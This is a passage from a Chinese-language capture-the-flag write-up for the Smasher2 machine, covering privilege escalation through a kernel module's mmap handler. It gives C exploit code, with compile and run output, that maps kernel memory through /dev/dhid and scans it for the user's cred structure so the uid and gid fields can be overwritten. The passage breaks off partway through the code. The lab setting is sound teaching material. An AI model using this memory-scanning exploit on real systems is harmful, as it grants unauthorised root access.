<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line">9Ogy7</span><br><span class="line">AUATSL</span><br><span class="line">D+&amp;H</span><br><span class="line">[A\A]]</span><br><span class="line">UHc=</span><br><span class="line">6DHID Device successfully closed</span><br><span class="line">6DHID Device mmap( vma_size: %x, offset: %x)</span><br><span class="line">6DHID mmap failed, requested too large a chunk of memory</span><br><span class="line">This is the right way, please exploit this shit!</span><br><span class="line">6DHID device has been opened %d time(s)</span><br><span class="line">1DHID failed to register a major number</span><br><span class="line">6DHID registered correctly with major number %d</span><br><span class="line">1DHID failed to register device class</span><br><span class="line">6DHID device class registered correctly</span><br><span class="line">1DHID failed to create the device</span><br><span class="line">6DHID device class created correctly</span><br><span class="line">6DHID mmap failed</span><br><span class="line">6DHID mmap OK</span><br><span class="line">6DHID initializing the LKM</span><br><span class="line">dhid</span><br><span class="line">6DHID unloaded</span><br><span class="line">version=1.0</span><br><span class="line">description=LKM <span class="keyword">for</span> dzonerzy dhid devices</span><br><span class="line">author=DZONERZY</span><br><span class="line">license=GPL</span><br><span class="line">srcversion=974D0512693168483CADFE9</span><br><span class="line">depends=</span><br><span class="line">retpoline=Y</span><br><span class="line">name=dhid</span><br><span class="line">vermagic=4.15.0-45-generic SMP mod_unload </span><br><span class="line">dhid</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">dhid.c</span><br><span class="line">set_node_perm</span><br><span class="line">dev_release</span><br><span class="line">dev_mmap</span><br><span class="line">dev_read</span><br><span class="line">dev_open</span><br><span class="line">numberOpens</span><br><span class="line">dhid_init</span><br><span class="line">fops</span><br><span class="line">majorNumber</span><br><span class="line">__key.41070</span><br><span class="line">dzcharClass</span><br><span class="line">dzcharDev</span><br><span class="line">dhid_exit</span><br><span class="line">__UNIQUE_ID_version76</span><br><span class="line">__UNIQUE_ID_description75</span><br><span class="line">__UNIQUE_ID_author74</span><br><span class="line">__UNIQUE_ID_license73</span><br><span class="line">dhid.mod.c</span><br><span class="line">__UNIQUE_ID_srcversion17</span><br><span class="line">__module_depends</span><br><span class="line">__UNIQUE_ID_retpoline16</span><br><span class="line">__UNIQUE_ID_name15</span><br><span class="line">__UNIQUE_ID_vermagic14</span><br><span class="line">__class_create</span><br><span class="line">__this_module</span><br><span class="line">class_destroy</span><br><span class="line">cleanup_module</span><br><span class="line">remap_pfn_range</span><br><span class="line">kfree</span><br><span class="line">__fentry__</span><br><span class="line">init_module</span><br><span class="line">device_create</span><br><span class="line">class_unregister</span><br><span class="line">printk</span><br><span class="line">size</span><br><span class="line">_copy_to_user</span><br><span class="line">__register_chrdev</span><br><span class="line">device_destroy</span><br><span class="line">__kmalloc</span><br><span class="line">allocated</span><br><span class="line">__unregister_chrdev</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.rela.text</span><br><span class="line">.rela.init.text</span><br><span class="line">.rela.exit.text</span><br><span class="line">.rodata.str1.8</span><br><span class="line">.rodata.str1.1</span><br><span class="line">.modinfo</span><br><span class="line">.rela__mcount_loc</span><br><span class="line">.rela.data</span><br><span class="line">.rela.gnu.linkonce.this_module</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.GNU-stack</span><br></pre></td></tr></table></figure>

<p>可以在/dev中看到设备：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ ls /dev/dhid -l</span><br><span class="line">crwxrwxrwx 1 root root 243, 0 Dec 27 06:16 /dev/dhid</span><br></pre></td></tr></table></figure>

<p>F-Secure的这篇论文在分解mmap处理程序以及如何查找其中的问题方面做得非常出色。 在第4节（第15页）中，介绍了如何利用它们。 它提供了一个示例，我将在此处尝试应用该示例，并了解我能得到多大的帮助。 我的想法是，我将使用mmap处理程序浏览内存以查找凭证结构（struct cred），该结构在此处定义：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line"><span class="comment">#ifdef CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    atomic_t    subscribers;    /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line"><span class="comment">#define CRED_MAGIC    0x43736564</span></span><br><span class="line"><span class="comment">#define CRED_MAGIC_DEAD    0x44656144</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    kuid_t        uid;        /* real UID of the task */</span><br><span class="line">    kgid_t        gid;        /* real GID of the task */</span><br><span class="line">    kuid_t        suid;        /* saved UID of the task */</span><br><span class="line">    kgid_t        sgid;        /* saved GID of the task */</span><br><span class="line">    kuid_t        euid;        /* effective UID of the task */</span><br><span class="line">    kgid_t        egid;        /* effective GID of the task */</span><br><span class="line">    kuid_t        fsuid;        /* UID <span class="keyword">for</span> VFS ops */</span><br><span class="line">    kgid_t        fsgid;        /* GID <span class="keyword">for</span> VFS ops */</span><br><span class="line">    unsigned    securebits;    /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable; /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;    /* caps we<span class="string">&#x27;re permitted */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_effective;    /* caps we can actually use */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_bset;    /* capability bounding set */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_ambient;    /* Ambient capability set */</span></span><br><span class="line"><span class="string">#ifdef CONFIG_KEYS</span></span><br><span class="line"><span class="string">    unsigned char    jit_keyring;    /* default keyring to attach requested</span></span><br><span class="line"><span class="string">                     * keys to */</span></span><br><span class="line"><span class="string">    struct key    *session_keyring; /* keyring inherited over fork */</span></span><br><span class="line"><span class="string">    struct key    *process_keyring; /* keyring private to this process */</span></span><br><span class="line"><span class="string">    struct key    *thread_keyring; /* keyring private to this thread */</span></span><br><span class="line"><span class="string">    struct key    *request_key_auth; /* assumed request_key authority */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">#ifdef CONFIG_SECURITY</span></span><br><span class="line"><span class="string">    void        *security;    /* subjective LSM security */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">    struct user_struct *user;    /* real user ID subscription */</span></span><br><span class="line"><span class="string">    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="string">    struct group_info *group_info;    /* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="string">    /* RCU deletion */</span></span><br><span class="line"><span class="string">    union &#123;</span></span><br><span class="line"><span class="string">        int non_rcu;            /* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="string">        struct rcu_head    rcu;        /* RCU deletion hook */</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125; __randomize_layout;</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，我看到了由当前用户（uid，guid，suid等）定义的8个连续的整数大小变量，然后是4个字节的securebit，然后是四个或五个（取决于内核）长整数，它们是这些功能 。<br>因此，策略将是：</p>
<p>使用mmap处理程序打开内存。<br>知道我们当前的uid是什么。<br>扫描内存以查找与当前用户的凭据结构相匹配的内容。<br>将uid/guid替换为0。<br>调用getuid（）看看我们现在是否是root。<br>如果是，则将功能替换为-1，然后以root身份生成一个新的sh进程，并中断循环。 如果不是，请将uid/guid设置回其原始值。</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>我将按照上面文章中的步骤构建脚本。 此代码可能令人生畏。 当我从这里开始并在Google上看到这篇论文时，我对此一无所知。 但是，如果您逐步执行代码，则很清楚它在做什么。</p>
<p>我要做的第一件事是尝试打开mmap设备。 我将从文章中获取代码（针对这种情况和样式，使用较小的mod）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %lx\n&quot;</span>, addr);</span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp1.c -o exp1</span><br><span class="line">exp1.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp1.c:29:33: warning: format ‘%lx’ expects argument of <span class="built_in">type</span> ‘long unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %lx\n&quot;</span>, addr);</span><br><span class="line">                               ~~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ls</span><br><span class="line">exp1  exp1.c</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp1</span><br><span class="line">[+] PID: 1911</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br></pre></td></tr></table></figure>

<p>这样就可以打开mmap处理程序。 好的开始。 并且它按预期挂在getchar（）上。 我可以在另一个终端中通过SSH进行连接，并查看该进程的内存映射（它仍然处于活动状态并等待），并在第一行中看到dhid映射到我请求的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/1911/maps</span><br><span class="line">42424000-132424000 rw<span class="_">-s</span> 00000000 00:06 440                               /dev/dhid</span><br><span class="line">55c3b4c63000-55c3b4c64000 r-xp 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e63000-55c3b4e64000 r--p 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e64000-55c3b4e65000 rw-p 00001000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b6e38000-55c3b6e59000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f3e7313d000-7f3e73324000 r-xp 00000000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73324000-7f3e73524000 ---p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73524000-7f3e73528000 r--p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73528000-7f3e7352a000 rw-p 001eb000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e7352a000-7f3e7352e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e7352e000-7f3e73555000 r-xp 00000000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e7374d000-7f3e7374f000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e73755000-7f3e73756000 r--p 00027000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73756000-7f3e73757000 rw-p 00028000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73757000-7f3e73758000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffdc6c81000-7ffdc6ca2000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffdc6cf5000-7ffdc6cf8000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffdc6cf8000-7ffdc6cfa000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>使用root shell（我将很快使用它），我可以查看所有内存。 我调用了mmap，其偏移量为0，大小为0xf0000000字节。 这意味着我现在可以进入该空间。 我将在一行上打上一行，以访问上面的所有内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/iomem</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Video ROM</span><br><span class="line">00000000-00000000 : Adapter ROM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : System ROM</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">  00000000-00000000 : Kernel code</span><br><span class="line">  00000000-00000000 : Kernel data</span><br><span class="line">  00000000-00000000 : Kernel bss</span><br><span class="line">00000000-00000000 : ACPI Tables</span><br><span class="line">00000000-00000000 : ACPI Non-volatile Storage</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : PCI MMCONFIG 0000 [bus 00-7f]</span><br><span class="line">    00000000-00000000 : Reserved</span><br><span class="line">      00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">    00000000-00000000 : 0000:02:01.0</span><br><span class="line">    00000000-00000000 : 0000:02:03.0</span><br><span class="line">      00000000-00000000 : ehci_hcd</span><br><span class="line">    00000000-00000000 : 0000:02:02.0</span><br><span class="line">      00000000-00000000 : ICH HD audio</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:07.7</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : IOAPIC 0</span><br><span class="line">00000000-00000000 : HPET 0</span><br><span class="line">  00000000-00000000 : pnp 00:04</span><br><span class="line">00000000-00000000 : Local APIC</span><br><span class="line">  00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : Reserved</span><br></pre></td></tr></table></figure>

<ul>
<li>查找凭证结构</li>
</ul>
<p>现在，更新上面的代码以通过获取当前uid来在内存中查找凭证对象，然后添加一个循环以连续八次查找该int：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我编译并运行时，它会发现19种潜在的cred structs:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp2.c -o exp2</span><br><span class="line">exp2.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp2.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp2</span><br><span class="line">[+] PID: 1999</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98484, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99384, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 14</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7744, credNum: 15</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e86c04, credNum: 16</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87384, credNum: 17</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87984, credNum: 18</span><br><span class="line">[+] Found cred structure! ptr: 0xb9327c84, credNum: 19</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>

<ul>
<li>查找当前进程Cred</li>
</ul>
<p>现在，更新代码，以便针对每个潜在的cred结构，将其更改为root用户和组ID 0，然后尝试运行getuid（）。 如果该值返回0（对于root用户），则说明我已经为当前进程修改了凭据结构。</p>
<p>更新代码，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        